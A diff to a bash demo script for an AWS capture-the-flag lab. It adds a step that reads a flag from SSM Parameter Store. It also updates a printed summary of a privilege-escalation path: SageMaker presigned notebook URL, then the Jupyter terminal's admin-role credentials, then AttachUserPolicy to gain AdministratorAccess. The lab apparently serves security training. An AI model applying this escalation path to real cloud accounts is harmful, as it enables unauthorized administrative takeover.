@@ -303,12 +303,28 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 11: Capture the CTF flag
+echo -e "${YELLOW}Step 11: Capturing the CTF flag${NC}"
+use_starting_creds
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-004-to-admin --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter \
+    --name /pathfinding-labs/flags/sagemaker-004-to-admin \
+    --query 'Parameter.Value' \
+    --output text)
+
+if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" == "null" ]; then
+    echo -e "${RED}Error: Could not retrieve CTF flag. Ensure admin access was successfully granted in Step 8.${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}✓ CTF flag captured: $FLAG_VALUE${NC}\n"
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (sagemaker:CreatePresignedNotebookInstanceUrl)"
@@ -319,11 +335,12 @@ echo "5. Accessed Jupyter notebook via presigned URL in browser"
 echo "6. Opened terminal in Jupyter (which has admin role credentials)"
 echo "7. Executed AWS CLI command to grant AdministratorAccess to starting user"
 echo "8. Achieved: Full administrator access"
+echo "9. Captured CTF flag: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → CreatePresignedNotebookInstanceUrl"
 echo "  → Access Jupyter Terminal (with admin role credentials)"
-echo "  → AttachUserPolicy → Admin Access"
+echo "  → AttachUserPolicy → Admin Access → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
